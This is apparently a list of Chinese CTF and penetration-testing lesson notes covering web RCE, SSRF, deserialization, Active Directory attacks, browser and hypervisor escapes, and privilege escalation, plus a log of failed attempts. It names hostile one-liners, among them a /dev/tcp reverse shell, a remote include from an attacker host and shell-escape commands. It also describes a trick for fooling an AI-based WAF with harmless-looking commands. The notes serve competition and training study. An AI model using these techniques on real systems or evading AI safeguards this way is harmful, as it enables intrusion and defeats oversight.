+XDebug client_port 13000 / rpdb 4444 / JDWP 任意端口 = 三语言 RCE 黄金三角
+gopher:// 可构造任意 TCP 原始数据, 是 SSRF 的万能武器
+拟态 = 多异构体 + 表决, 必须每个异构体都攻破才能拿到一致响应
+靶场综合题 = 备份源码审计 + Jenkins RCE + 信息收集 + 数据库利用 + 域渗透
+内网渗透路径: web 入口 → 备份源码 → 中间件漏洞 → 信息收集 → 数据库 → 域内 → 域控
+Windows 特权滥用 (敏感 ACE) 是横向移动的关键, ACL 审计是核心
+CVE-2022-26923 是 AD CS 提权到域控的高危漏洞, 必须及时打补丁
+sqlite3 的 load_extension 允许任意 .so/.dll，是 PWN 题沙箱逃逸金钥匙
+.open :memory: 可绕过文件权限，结合 sqlite3_create_function 注册 system 调用是 CTF 隐藏赛道
+libc.so.6 作 extension 暴露符号可用来泄地址
+ATTACH DATABASE 写文件是 sqli 写 webshell 经典手法
+字典 key in user_substring 漏洞 (应该用 == 严格匹配)
+WebRTC 内网穿透靠 TUN/STUN 公司/学校可能判定违规
+SSLKEYLOGFILE 通用 DTLS 解密法
+aiortc 自定义证书 (RSA→EC) 是出题常见魔改
+URL 解析差异 (; 截断) 可绕黑名单 filter (Tomcat/GlassFish 通用)
+SPEL ClassPathXmlApplicationContext 是 Spring 历史 RCE 标准姿势
+Java agent 插桩是横向移动高阶武器 (agentmain 钩 socket)
+ActiveMQ OpenWire command 31 是反序列化触发点 (TcpTransport.oneway 钩子点)
+低权限提权路径: broker 是中间人, 高权限用户接收恶意消息即 RCE
+AWD 修复策略: 删漏洞代码/修 TRUE→FALSE/加白名单
+webshell 查杀 (D盾/河马) + 备份源代码 + 改弱口令 + 看日志
+Flask render_template_string SSTI 加固: 花括号过滤 {{ }}
+AWD 节奏: 一轮 100 分, 必须批量脚本 (4000+ 分/轮)
+银行流水借贷标志位 + 金额求和是资金初探通用思路
+调证平台 (重明) 输入卡号查群组 ID
+AES key 在 AndroidManifest meta-data 是 Android 应用通用藏点
+Electron app.asar RCE 是 XSS 升级终极 (preload.js execCommand)
+案件卷宗 (案件+笔录+尸检+物品清单) 是综合研判信息源
+涉网犯罪研判复合型 + Electron preload.js execCommand(1818) + this.parent chatClientApi 上下文是 XSS→RCE 关键
+内网穿透 NATAPP 双隧道 (TCP+Web) 是反向 shell 必备
+AES key 在 SDK appKey 常点 (com.xingguang.PUSHSDK.appKey)
+二维码解析 APK 下载链接, 末尾 ID 是关键标识
+Bearer JWT 头 + 分页爬虫是名单获取标准姿势
+innerHTML 无过滤直接 XSS; autofocus+onfocus 自动触发绕过 replace 过滤
+form.action+submit 用 javascript: 伪协议; eval(location.hash.slice(1)) 绕过长度限制
+DOMPurify + tel: 伪协议 + 可点击元素可绕过
+replace 过滤 alert 可用 Function(/ALERT(1337)/.source.toLowerCase()) 构造
+8680439..toString(30) 是 JSFuck 类变形; data:text/html;base64 是 object 注入标准绕过
+Node 深合并 Object.entries 递归赋值是经典原型链污染漏洞
+Object.prototype.data.path.shell 可被 npm preinstall 利用，污染 prototype 是 npm install 阶段 RCE
+SVG onload 在 innerHTML 中执行 JS = XSS 过滤器的 SVG 死角
+Proxy get() 陷阱可被用于拦截敏感访问
+window.addEventListener('unhandledrejection') 泄露错误堆栈能直接拿到 node_modules 路径
+SQLite3 自定义函数漏洞：edit(1)+edit(2) 注册为 vuln 是典型注册点攻击面
+EDITOR 环境变量 + system 命令注入是 Unix 工具的经典 CVE 模式
+gnome-calculator 弹窗是 RealWorld 题演示 RCE 的最直观方式
+AI WAF 绕过常见：拼接无害命令 ls/cat 让 AI 判无害
+temp%llx 临时文件名可预测，write 后立即 system 形成完整 RCE 链
+Redis 3 + Windows 可写 .so 上线 CS（C/S 分离木马场景）
+AD CS 证书服务 + 机器账户 + passthecert.rbcd = 无域管密码登录 DC
+SweetPotato 利用 SeImpersonatePrivilege 是 Windows 服务提权通用套路
+RBCD + S4U2Self 是绕过域管密码的现代 AD 攻击路径
+ThinkPHP 5.0.23 _method 构造 + filter[]+server[REQUEST_METHOD] 是固定 RCE 三件套
+sudo mysql -e '! cmd' 提权无需 root 密码
+crackmapexec 是 DCSync + PTH 的轻量化命令行替代
+入门靶场固定三段式：web RCE → frp 代理 → MS17-010 → DCSync
+secretsdump.py + 机器账户 + ../rel.wmiexec.py 是入门域横向三件套
+DCSync 不需要登录 DC，只要域内有机器账户权限即可
+fscan 的 MS17-010 红标是横向目标识别第一信号
+ThinkPHP 5.0.23 RCE URL 必须带 ?s=captcha
+phpMyAdmin 日志写马是 PMA 无文件上传时的标准 getshell 路径
+Mimikatz kerberos::golden 伪造黄金票据需要 sid + krbtgt hash + 用户名
+三种 getshell 姿势：ThinkPHP RCE / 信呼 OA 上传 / phpMyAdmin 日志写马
+Redis 主从复制 + SUID 提权是 redis 入门组合拳
+WPCargo 6.x + magic PNG payload 是未授权 RCE 经典利用
+Rubeus S4U2Self 扩展代表域管访问 LDAP 服务是约束性委派核心
+MSSQL xp_cmdshell + SweetPotato = system 权限
+机器账户 + S4U2 = 间接获取域管凭据
+Docker 2375 未授权 + -v /:/mnt 挂载宿主机根目录是云上容器经典突破
+Whisker + Rubeus S4U 是 AD CS 机器账户证书攻击标配
+SweetPotato 利用 SeImpersonatePrivilege 提权 system
+IIS + ASP + FTP 匿名上传是 Web 入口到 Windows 系统的捷径
+V8 typed-array-set 的 EnsureAttached 是 IsDetachedBuffer 强校验点
+%ArrayBufferDetach 是 V8 intrinsic 的 detach 入口（仅 --allow-natives-syntax 可用）
+parser-base.h 的 ParseV8Intrinsic() 可被题目修改为无 flag 调用
+typed_array set 跨越 detach 状态时写的是 freed memory → tcache fd 篡改
+V8 RCE 通用链：detach → UAF → 覆盖 → 任意读/写 → shellcode
+Mojo IPC 新增 interface 必须注册到 content_browser_manifest.cc 才能在 renderer 调用
+CookAndEat 接收 interface 参数是引用计数 UAF 经典触发点
+Blink 中 interface Ptr 是胖指针（vtable + data），伪造 Ptr 即任意 C++ 调用
+Chrome 沙箱逃逸通用链：Mojo IPC → Impl side UAF → 虚表指针覆盖 → RCE
+ExposeInterfaceFilterCapability_Deprecated 是新版 Mojo 接口过滤机制
+parse_url + curl 组合 SSRF = scheme://host/path 绕 host 白名单
+file:// 协议读源码是 SSRF 第一步（无需 RCE）
+PHP 7.3 parse_url 解析差异：scheme 可以是任意 IP
+跨目录 /../ 配合 scheme://host 是路径穿越关键
+phpinfo 暴露 PHP 版本信息（决定可用漏洞）
+Node.js 8 低版本 http.get 存在 CRLF 拆分漏洞
+CBC+PKCS7+padding oracle 可伪造任意明文
+HTTP 走私打 SSRF + 命令执行
+/C00mmmmanD 是隐藏命令执行端点
+bash -i >& /dev/tcp/ip/port 是反弹 shell 经典
+fastjson + BCEL 字节码可以执行任意 Java 方法而无需上传 class
+Codeception RunProcess → Guzzle AppendStream → CachingStream → PumpStream 是 PHP 反序列化经典 gadget 链
+OpisClosure\serialize($a) 把任意 PHP 闭包对象序列化进 PumpStream.buffer
+Spring Tomcat 路径穿越 ..; 绕过对 /admin/test 路径限制
+curl/wget 被 ban 时 URL+HttpURLConnection+GET 是 DNS 外带 flag 通用方案
+Javassist CtClass.makeClassInitializer().insertBefore(cmd) 是动态类静态块注入
+CC4 链 vs CC1/CC6 区别在 TrAXFilter 作为命令触发器
+oastify.com / Burp Collaborator 是 DNS 外带接收端标配
+php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag 是 UTF-8 转宽字符读文件经典技巧
+phar 反序列化三步走：setStub 伪装 + setMetadata 触发类 + 改 3:{→4:{ 绕过 __wakeup
+JSON 解析 bypass：-3.3e99999999999999 让 float 转 int 失败触发 fallback
+gopher:// 协议打内网是 SSRF 王牌，配合 302 跳转实现 click→backup→exec 链
+RSA 给私钥 + strxor 简单密钥 → pow(c,d,n) 直解是 CRYPTO 入门套路
+LD_PRELOAD + /proc/pid/fd/ 多线程爆破是 RCE 通用套路
+Hessian2 反序列化中 EqualsBean+ToStringBean 链是 Java 反序列化经典 sink
+Unsafe.allocateInstance 可绕过构造方法直接分配对象，配合反射改字段触发 RCE
+BRFW 固件爆破用时间侧信道逐位恢复 1024 位二进制
+WebLogic/Hessian2/etc Java 中间件 RCE 一律先确认序列化格式（ObjectOutputStream vs Hessian2 vs JSON）
+.user.ini + auto_prepend_file 是 PHP LFI 经典入口，配合 nginx access.log UA 写马即可 RCE
+max_input_vars=1000 触发 PHP Warning 导致 header 失败可绕过 CSP
+Jetty Configure XML 支持 BCEL 字节码加载是 Java 反序列化另类入口
+Capabilities 提权（java setuid capability）需写 SetUID.c + SetUID.java + gcc 编译 .so
+源码审计注释泄露逻辑是 CTF Web 重要突破口
+AWDP 赛制需修服务器 + 攻击别人双重挑战，常用 SSRF+gopher+SQL 三件套
+php://filter convert.iconv 串可逐层降维/升维，UTF8→CSISO2022KR 是经典起手
+Redis RESP 协议 + Pickle 反序列化 + SSTI 是 Web 综合高级套路
+seccomp 禁 execve 时 ORW 是 PWN 必备
+AWDP 防御方需打 patch，攻击方需抢分
+PHP 反序列化利用 SPL 类（SplFileObject）__construct 行为可构造 POP 链读文件
+ereg() NULL 截断漏洞：9e9%00*-* 绕过 ^[a-zA-Z0-9]+$ 但 strlen=4
+md5 强类型碰撞需二进制字符串 + 1 字节差异（0x00/0x02）
+preg_match 黑名单绕：缺少 * 号单字符可用通配符
+类 A __wakeup 和 __construct 都执行 foreach 是通用 POP 链入口
+xhcms 架构识别：mc-files/mc-core.php?file= 是任意文件读取入口
+ThinkPHP form_id 直接传 system() 触发 eval 是经典 RCE
+后台上传三件套：Login→Config 改白名单→Upload/uploadImages.html
+WAF 绕 Content-Type: image/jpeg 实际检查 magic bytes
+目录穿越 title=../templates/index.html 可 SSTI
+badpotato 是 Windows 权限提升工具，搭配 defender 免杀 CS 马
+hash 传递（PTH）用 mimikatz sekurlsa::pth
+noPac（CVE-2021-42278+CVE-2021-42287）用 sam_the_admin.py 打域
+Linux Vim-SUID 提权：`vim -c ':!/bin/sh'`
+ADCS 域证书漏洞 ESC1：模版允许低权限用户指定 SAN
+POP 链触发点：__toString → 访问 role 触发 __call → __call 跳到 execute → file_get_contents
+RSA 公因数 gcd(n1,n2)=p 是共模攻击的变种（不同模但共因数）
+fmt 字符串负索引可越界访问栈（vs 正 idx 仅栈内）
+AES/XOR 算法逆向关键：把 long 拆成 (high<<32)|low 分量分别处理
+Express SQL 注入 username 加 ` 反引号触发 shell 变量替换 = RCE 经典
+SSTI 8 进制 Unicode u002f 等价于 u002f 分隔符
+phar:// wrapper 触发反序列化是 LFI 类通用思路
+异步并发爆破找路由：asyncio + aiohttp 提高爆破效率
+.htaccess SetHandler application/x-httpd-php + UTF-7 编码 = WAF 绕过 + PHP 解析
+POP 链触发 file_put_contents 写 webshell 是 PHP 反序列化常用 gadget
+Vigenère 已知 key 直接解密
+MT19937 给 624 个 32bit 输出 = 完全预测 state（不需全部 624）
+PHP filter chain oracle 攻击：每次抛错泄漏 1 bit 信息
+匿名类（class@anonymous\0file:line$0）通过字符串类名反射调用
+pcntl_exec 是 disable_function 绕过的常见手段
+Rust include! 宏 + FFI 调 C 可绕 std 过滤
+Tomcat AJP GhostCat (CNVD-2020-10487) 是稳定 web 入口，8009 端口必扫
+PetitPotam + WebClient + NTLM 中继是 AD 域渗透 2022-2024 稳定攻击链
+RBCD + nopac 是 2022-2024 AD 提权标配，缺一不可
+BloodHound 采集 ACL 信息（CreateChild/WriteDacl）是规划攻击链的关键
+Flask render_template_string 配合 format() 是危险的 SSTI 模式
+Node.js String.replace 的 $` $' lastMatch 特性常被忽视，可绕 SQL 注入字符过滤
+URL 编码（%2C 等）是绕 URI 字符限制的通用方法
+命令执行可走 curl+bash/nc 回传，不一定要 cat/flag 关键词
+无参 RCE 经典链：eval(array_rand(array_flip(current(array_values(get_defined_vars())))))
+SSTI \u005f\u005f 8 进制 Unicode 转义是绕黑名单通用手法
+凯撒密码 A→X B→Y C→Z 是 ROT-3 移位
+Python stegosaurus 是 .pyc 隐写首选工具
+线程竞争 + 共享 num 变量是经典 flag 提取套路
+JWT user 字段注入 SSTI + HS256 secret 爆破 = 经典 web 鉴权旁路
+sendline('-1') 整数溢出触发 off-by-null 是经典 pwn 入口
+unsorted bin fd 指向 main_arena 是 libc 泄露通法
+libc-2.27 无 tcache，__free_hook 覆盖直接 system
+HTML 注释藏 flag 是 web 入门点
+ECC 小素数 (p<2^16) 直接暴力枚举私钥 d
+PeakeyEncode emoji 替换是日本 CTF 常见迷因编码
+Shellshock CVE-2014-6271 (){:;}; echo; cat 是 CGI/PHP 经典 RCE
+vsFTPd 3.0.3 弱密码爆破 agita:zyyzzyzy 是经典痕迹
+语义 WAF 漏洞：/* 被双引号包裹不起注释作用 + 真注释 /* 起作用
+MySQL 报错盲注用 FIELD() 函数构造布尔
+花括号 {a+%0d…%23%0a.%0a…} 绕过 information_schema 检测
+SQL Server len('/*')/(seleCT ... for xml path) 截断技巧
+2025 最新 Web 攻击面：Next.js Server Actions __proto__ 污染 + JS 对象字面量构造
+ap_expr 的 file 函数是 Apache 的隐藏文件读取向量
+ThinkPHP 的 {args|func} 写法能绕过很多函数名过滤
+JSON5.parse 对 __proto__ 的处理与 JSON.parse 不同，是原型链污染跳板
+gopher-lua pairs(_G) 枚举是沙箱题必备第一步
+DirectoryIterator + glob:// 是稳定的 LFI / 文件名爆破向量
+XXE 无回显必须 OOB + 外部 DTD 外带 (data:// / http://)
+SSRF + Redis 未授权写 Webshell 是内网渗透标配链
+.htaccess 一旦能上传, 可改整个目录解析策略
+Python 3.7 + urllib CVE-2019-9740 是稳定 CRLF + redis SSRF 链
+MongoDB aggregation 的 $toLower 能绕过 assert.notEqual 字符串比较
+ASCII 0x7f (DEL) 是 zip check 漏洞, 能删除前 5 字符 flag{
+钓鱼邮件 DKIM/SPF/DMARC TXT 记录是 flag 三段式经典分布
+Apache CVE-2021-41773 路径穿越 + CGI 执行是 2.4.49 通杀
+Prettier 配置 RCE 是 npm 供应链攻击典型
+Lua TEA 变种 sum/delta 不同
+C srand 爆破 + math.random 是密码学综合
+pickle 反序列化链 getattr/dict.get 经典
+Node.js template.constructor 绕过沙箱
+RSA info = m + e*m 可用 (e*info-1)/n 找 p+q
+RSA gcd 公因子恢复（s-e 与 o-e 的差）
+智驾安全涵盖 web + crypto + pwn 综合
+ezecc 关键观察：K = (..., 4359... : 4359...) K = (G, kG)，求 p 时所有点代入曲线方程再 gcd
+Signatrue 用 A,B 矩阵构造 LLL 求 d 是教科书 HNP
+2024happy 把 RSA 与 HSSP 拼接是密码学综合题经典套路
+LD_PRELOAD绕 disable_functions 是 POP 链经典组合
+vmdk 仅主机模式 = 防 VM 反弹的标准隔离方案
+robots.txt 路径扫描 + 路径穿越 + AES SSH 私钥是 docker 入门链
+bash_history 暴露 docker 命令是凭据恢复入口
+TLS 客户端证书密钥删除后需查备份/.swp/git history
+OPERATION BAD PRIMATE 是丹麦 CNE 培训靶场，docker 逃逸 + TLS 恢复是核心
+Flask 路由 upload?file_path=XX 经典路径穿越 → 任意文件读
+硬编码 hash=backdoor 是 CTF 管理员入口常见骚套路
+os.system 拼接 file_path + base64 > /tmp = 反引号命令注入
+自定义 AES-CBC cookie 用 iv 随机但 key 固定 → 可重放
+json.loads + validate_cookie 双层校验是 Web 鉴权标准链
+API 弃用版本不删是常见漏洞
+DOCX/PPTX 元数据泄露作者
+4 位 PIN 暴力无防是经典
+sitemap.xml + DOCX 元数据是 OSINT 经典组合
+Move 语言资源（coin/balance）是 Sui 链原生 first-class 类型，转账必须手写 transfer::public_transfer
+DEX flash loan 整数溢出 = amount_out = coin.value * vault.coin_b / vault.coin_a 公式差异利用
+Subset Sum 0/1 解 = 把问题分成 3 个子集，每个子集元素 0/1，brute force 出 3 个数组
+DP 矩阵路径 = f[i][j] = f[i-1][j] + row[j-1] 是 LeetCode 62 unique paths 标准思路
+Move CTF 2024 是 Sui 基金会赞助的国际赛（MoveBit+ChainFlag+MoveFuns+OpenBuild 主办）
+Linux cron 服务引用域名时，本地 /etc/hosts 优先级最高 → cron 域名劫持是真实持久化攻击面
+ssh2john + john 爆破 RSA 私钥 passphrase 是 SSH 渗透经典技巧
+TryHackMe 房间设计覆盖 OWASP Top 10 + Linux 提权链
+flask SECRET_KEY=os.urandom(2).hex() 实际仅 4 字符 16^4=65536 空间，flask-unsign 秒出
+Pickle 黑名单可大小写替换绕过（b'BuIltIn' → 还原后等于 'builtin'）
+Java XXE+XPATH 盲注 substring 逐位爆
+魔改 TEA delta 可从 0x9E3779B9 改成其他值
+PWN 数组越界用负 idx（如 edit(-4)）写函数返回地址为 ret+prdi+binsh+system
+整数溢出 (scanf("%d", &len) 输 -1 = 0xFFFFFFFF) 是 pwn 高频套路，配合 read 实现任意长度栈溢出
+write(fd, buf, n) 自动把栈上 canary 当普通数据输出 → 二次执行补 canary 是盲 pwn 通用套路
+race condition 类 web（ezbank）靠并发转账放大余额，无锁设计是根源
+libc 2.35 ret2libc 用 binsh 字符串在 libc 数据段，配合 system 偏移直接 RCE
+鸿蒙 abc 文件用 ohos-decompiler 反编译可还原 bytecode，关键函数 seededRandom(42) 固定种子让 permute 可逆
+truecrypt2john 是 TrueCrypt/VeraCrypt 卷取 hash 的标准工具
+单字符 MD5 字典爆破 = 7 个固定值（a/b/c/d/f/l/t）查表即可
+fmtstr_payload 偏移 8 是 amd64 通用值（6 reg + retaddr）
+改 setvbuf=system 是 fmt 任意写的'换点策略'，避开 __free_hook
+PHP ?a[]=123 是数组绕类型检查的经典 trick
+JWT 密钥在 .class 中是字符串常量，strings 命令直接可读
+tar 路径穿越 + JSP 映射 web.xml 是写 shell 经典链
+MQTT hash31 = (31*x+ord) 累加自定义 hash
+TOCTOU 竞态在 sleep(2) 期间改合法 vin 是经典漏洞
+LCG 单块已知明文反推 seed（glibc rand_r 兼容）
+Blind SSTI 时延盲注模板: sleep N 判 RCE → find_flag_path → wc -c 算长度 → cut -c 提字符
+RSA Wiener 攻击 e/N^k 连分数展开（k=6 是变种）
+JS 源码泄露（webpack chunk）→ 找默认凭据
+GAME 自定义 binary 协议 magic 头是协议识别关键
+前端 SPA 路由暴露 API endpoint 是审计起点
+压缩炸弹 zstd/bunzip2 循环 = 自动化解压+判退出条件
+libc-2.27 无 tcache，fastbin + unlink 是经典路径
+aarch64 ret2csu 是 ARM64 libc 函数调用桥接必备 gadget
+Process Hollowing 五步流程 FindResourceW → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread 是固定套路
+BigI 多轮混合加密（add+mul+subabs）= Sage 逆推最优
+Slice/Buffer 共享 data_ptr 但 GC 漏判 = 经典 double free 入口
+Builtin func_ptr overwrite 是 GC 语言特有 UAF 利用模型
+多约束 key 求解 = z3 多约束拼接（tag XOR + nibble + colsum + LFSR）
+AES key 派生链 sha256(key[:16]) + md5(key[16:]) 是常见 splitter
+Solidity governance 接管三步：setGovernance + execute + withdraw
+Function.prototype.caller 是 Node.js jail 的最后后门，配合 arguments.callee 反射可绕过 string eval 禁用
+Node 模块 wrapper 的第 7 层 .caller 是 module 对象内部结构，需精准递归次数
+extendedScope 暴露的 Object/Array/String 类 + . 属性访问算子是 Lisp.js 等自定义沙箱的标配
+--disallow-code-generation-from-strings + --disable-proto=delete 是现代 Node.js jail 的标准防御，必须全部突破
+lkvm 的 virtio PCI config 访问 config_offset = -20 是关键 OOB 漏洞（CVE-2021-45464）
+bdev->vqs[vq] 中 vq 无边界检查是 OOB 写指针的入口，配合 exit_lists 形成 RIP 劫持
+echo c > /proc/sysrq-trigger 触发内核崩溃会调 lkvm 退出 handler，是 escape 触发器
+JOP (Jump Oriented Programming) 在 hypervisor 逃逸中比 ROP 更常见，因为栈空间受限
+log4shell 必须搭 LDAP/RMI server + 字节码类
+Apache 2.4.49 路径穿越 + mod_cgi = RCE
+音频频谱藏 flag 是 Misc 高频考点
+Fermat factorization 处理 p/q 接近 RSA 极快
+JerseyCTF 风格：log4j + Apache + audio + RSA 各一题
+SetUID 加载时把 euid 改成文件属主 uid
+snprintf+system 拼接用户输入是经典命令注入
+已 open 的 fd 即使 setuid 失效后仍可读写
+pickle 反序列化本质是栈机执行 opcode，不是单纯对象还原
+__reduce__ / R / c+i / __setstate__ 四种 RCE 入口等价
+RestrictedUnpickler 黑名单可用 getattr+globals+builtins 链完全绕过
+反射链 dir+reversed+next 是 Python 沙盒逃逸通用思路
+协议头 x80+x04 = protocol 4 + FRAME x95 是协议握手标识
+Pug #{} 是 JavaScript 表达式容器，绕过 sandbox 后能调 global.process
+多线程栈溢出覆盖 canary 不触发 __stack_chk_fail 是 libc 2.30 行为
+ogg (one_gadget) 是 libc 已知 RCE 地址集合，提前 pwntools one_gadget 列出
+QLExpress 阿里 QL 表达式求值器触发任意 setter/getter 是 2024 新型 RCE 入口
+K-Cessation 加密中'密文值揭示 wheel 局部关系'是解方程的关键
+LLVM IR 自定义函数 WMCTF_OPEN/READ/WRITE 是 LLVM pwn 入门模式
+LLL 同余 Diophantine 攻 RSA p,q 是 2024 新趋势
+Rust box crate 提供 AES S-box 等基础组件，可作密码题密钥流来源
+邮件主题字段含分号 ; 注入额外 HTTP header 头是经典 SSRF/LFI 攻击向量
+size=-1 整数溢出到 2048+ 字节后跟 ROP 是 CTF PWN 标配
+content_path=/proc/uptime 是 mail 客户端读任意文件的非预期
+栈溢出绕过 canary 需配合整数溢出或栈外写
+邮件主题 ;content_path= 是 ';' 注入的典型 web bug
+AI Agent 渗透时代,关键词层+调用签名层+CVE 编号层 anti-复读机制是 LLM CTF 自动化的核心
+多 MCP 并行 (chrome-devtools + Kali + MSF + Ghidra) 是当前最优架构
+Orchestrator + Executor/Browser/C2/Reverse 4 Agent 协作是 CTF AI 通用模板
+GLM5 vs GLM5.1 在 CTF 渗透场景表现差异显著
+MCP visibility=subagent:browser 是隔离浏览器上下文的标配
+call_user_func($func, $param) 是 PHP 经典 RCE 入口, 函数名即可控就是灾难
+ISO-8859-1 (latin1) → UTF-8 双重编码还原是乱码恢复通用思路
+盲文密码 = 标准 6 点制, 直接查表可解码
+?file= LFI 必须配合 filter/base64 才能读二进制 (Servlet class)
+V8 Map enum_cache 漏洞：删 InitializeFastPropertyEnumCache 后属性 transition 不重建 enum_cache 但仍按旧长度访问，触发越界读
+PropertyArray 存储于老年代 in-object properties
+DescriptorArray header 包含 number_of_all_descriptors/number_of_descriptors/raw_number_of_marked_descriptors 16 位切片
+V8 12.2 d8 构建 + symbol_level=2 + is_debug=true
+0 解薛定谔题特点：必须有历史漏洞背景知识 + Windows 特性
+PyInstaller _rmtree_unsafe：os.scandir+entry.is_dir(follow_symlinks=False) 但 is_symlink 被 catch 后 continue 是 race 漏洞
+matplotlib 写 C:\Windows\Temp 可预测目录 + Windows named pipe ACL
+Windows service 低权限运行需提权到 SYSTEM
+挑战时间 3 分钟 + 只 3 次机会限制
+CommonsBeanutils + TemplatesImpl + Javassist 是 Java 反序列化 RCE 三件套
+LLL 格密码把线性方程组转 2x2 矩阵求最短向量
+fmtstr 泄 canary 用 '%17$llx'（偏移由栈帧决定）
+p64(canary) + p64(0) + p64(ret) 是过 canary 标配
+backdoor 函数省去 ROP 链构造
+Go Router handle(mws=append) 中间件链越权是 web 经典
+limiter1+limiter2 + select{} 并发限流绕过易踩坑
+0x2d44 read(0x500) 溢出覆盖 ptr → write_got leak → ROP 套路
+Netatalk CVE-2022-23121 通过 AppleDouble 偏移改 _dl_rtld_lock_recursive 是经典 AFL 漏洞
+klang 编译器类型混淆 fuzz 找 type confusion 漏洞
+### FAIL
+试图直接拿完整 cookie → 失败：服务端只 echo 已 commit 部分
+试图读 IRP_MJ_DEVICE_CONTROL 表 → 失败：偏移是 0x10 步长不是 0x8
+试图直接调 init_challenge → 失败：非 entry 需 script 包装
+试图猜 discrete_log → 失败：必须算130-bit 大数对数
+试图用 default parser → 失败：必须自定义才能触发 require
+试图不打 patch 直接用 CVE → 失败：CVE patch 限制了调用
+试图 cat flag → 失败：被过滤
+试图直接 JWT改 admin → 失败：必须 alg=none
+试图直接 JSON 注入 → 失败：ORM 拼接
+试图内联 XXE → 失败：无回显 → 必须 OOB
+试图直接 cat flag → 失败：被过滤
+试图普通空格 → 失败：被过滤 → ${IFS}
+试图 MongoDB where 子句 → 失败：被过滤
+试图默认 autoEscape → 失败：默认 true 必须 false
+试图加固 Java 题 → 失败：无加固时间
+试图 GOGO 出网 → 失败：内网严格
+试图用 php://filter 读源 → 失败：黑名单过滤 file 关键字
+试图 base64 编码 system 字符串绕过黑名单 → 失败：include 不执行 base64 解码
+试图 ?file=http://attacker/shell.txt → 失败：黑名单过滤 http
+试图反编译 pwn 二进制分析逻辑 → 失败：内联库函数太多
+试图手工解 rclone obfuscate → 失败：base64 表非标准
+试图用常见 SQL 注入 union select 爆破 → 失败：select 被过滤
+试图直接用 hxp 原 EXP → 失败：含 '4' 字符触发 _ 黑名单
+试图 base64 编码绕过黑名单 → 失败：include 不解码 base64
+试图用 pearcmd → 失败：环境未安装 pear
+试图用 union select 注入 → 失败：SQL 注入点不在 md5_php
+试图 ?file=../../etc/passwd → 失败：非 php://filter 不能读 PHP 文件源码
+试图直接反序列化 admin 改 password → 失败：filter 函数替换
+试图 sudo -l → 失败：当前用户不在 sudoers
+试图 cron /etc/cron.d/ 写任务 → 失败：权限不够
+试图 wget 下载 root 脚本 → 失败：目录无写权限
+试图 union select SQL 注入 → 失败：Java 应用非 PHP 风格
+试图用普通 JNDI payload → 失败：JDK 8u191+ 禁用远程 codebase
+试图 ysoserial 直接打 → 失败：链版本不匹配需选 gadget
+试图用 ASCII 字符 0/0 → 失败：必须全角字符触发 NAN
+试图用普通 PHP 标签写文件 → 失败：黑名单拦截
+试图手工解 BMP LSB → 失败：必须按 RGB 通道重组
+试图用 Python builtins.open → 失败：sandbox 拦截
+试图用 zip-slip 写文件 → 失败：unzip 命令注入更直接
+试图用 $where 注入 → 失败：MongoDB 6+ 已禁
+试图写 shell 进 pma → 失败：ctf 用户权限低不能写文件
+试图手工读其他队伍 encrypted_flag → 失败：没弱口令只能等系统漏洞
+试图直接用 bash 反连 OpenSSH → 失败：需 ProxyCommand 注入 nc
+试图标准 SSRF 打 ezezez_php → 失败：需 Redis 主从复制 + dict 协议
+试图标准 vm2 沙箱逃逸 → 失败：3.9.16 需 Error+Proxy+apply 绕过
+试图常规 Java 反序列化链 → 失败：AliyunCTF 2023 bypassit1 路线特殊
+试图不修改 themePath → 失败：默认主题不能跨目录读文件
+试图不解 LSB → 失败：灰度图 LSB 异或才出隐藏位
+试图不解 zend_test.so 直接运行 php → 失败：自定义 engine 改了 opcode
+试图标准 Fastjson 反序列化链 → 失败：需 XString + HotSwappableTargetSource
+试图用 TemplatesImpl gadget → 失败：黑名单含 TemplatesImpl
+试图用 JNDI 直接 ldap 反弹 → 失败：黑名单含 Jndi 关键词
+试图用 FastJson 反序列化 → 失败：jar 不是 FastJson
+试图绕过 /install 的 .. 过滤 → 失败：必须用 /upload + ../ 走间接路径
+试图不污染 safe_modules → 失败：必须显式 ['os','builtins']
+试图不解 phar:// stub → 失败：PILER 检测必须 GIF89a + gzip
+试图不解 JVM-SANDBOX uninstall → 失败：RASP 拦所有 exec
+试图不解 __wakeup diff → 失败：phar 触发条件不够
+试图直接 sys.modules['__main__'].app.add_api_route → 失败：ssti calc 字符串限制
+试图用普通 mkdir抢 phpcode 路径 → 失败：题目检测目录存在与否
+试图对 ECDSA 单独 nonce 攻击 → 失败：nonce 受线性组合保护
+试图直接 admin/123456 登录 SQLUP → 失败：必须 LIKE 通配符
+试图 .php 后缀上传 → 失败：黑名单禁 p 字符
+试图数字 md5 爆破 4 位 → 失败：必须 md5('a')=0cc... 单字符映射
+试图直接打 one_gadget → 失败：必须先 malloc_hook 写 one_gadget
+试图只打单个网段 → 失败：14 flag跨 4 网段必须横向
+试图向日葵旧版 RCE → 失败：题目用 sunlogin_rce CVE-2022-10270
+试图不打 ansible delegate_to=localhost → 失败：必须本机 localhost 反弹
+试图不打 javaagent 直接连6666 → 失败：必须 hook Proxy.send() 注入 payload
+试图不解多层 php://filter → 失败：必须 zlib.inflate|zlib.inflate|dechunk 多层
+试图不解 POP 链 private $flag → 失败：必须 PHP 序列化细节绕过
+试图用 hackbar xss payload 一把梭到 ceye.io → 失败：payload 不合适，需走 /content 回显
+试图用 img 标签触发 XSS → 失败：响应不匹配
+PWN 试图直接栈溢出写 shellcode → 失败：buffer 太小，需栈迁移
+试图用 Spring 常规 SpEL 注入 → 失败：必须 [[${...}]] 双层括号触发
+试图直接拼 file_get_contents 路径 → 失败：class@anonymous\x00 截断才生效
+试图解 Rust 字符串里的 ORW 汇编 → 失败：必须看出是直接 sys_open/sys_read/sys_write 三连
+试图用默认 session → 失败：自定义加密不可预测
+试图用 sqlmap 跑后台 → 失败：PDO prepare 字符串拼接注入必须 pop 链改 admin 密码
+试图直接 phar:// 触发 → 失败：必须先有 pop 链触发点
+试图用 jwt token 算法伪造 admin → 失败：用的是 cookie session 不是 JWT
+试图传统 SQL 注入登录后台 → 失败：不是 sql 题型，关键点在 uint32 整数溢出
+试图直接 sudo -i 提权 → 失败：版本含 CVE-2025-32463 必须用 chwoot 漏洞 exp
+试图单跑 saferEval eval() 全字符串 → 失败：关键字 Math.constructor 被正则匹配
+试图直接 /secretserver/ 端口转发 → 失败：secretserver 在内网 1337
+试图用 prototype pollution 改 Object.constructor → 失败：Object 是 freeze 状态不可写
+试图直接拼 SQL 命令测 yunnuuu.php → 失败：是 PHP 弱类型比较不是 SQL 注入
+试图用 Groebner basis 暴力解 Quaternion DLP → 失败：运算量爆炸，转 BSGS
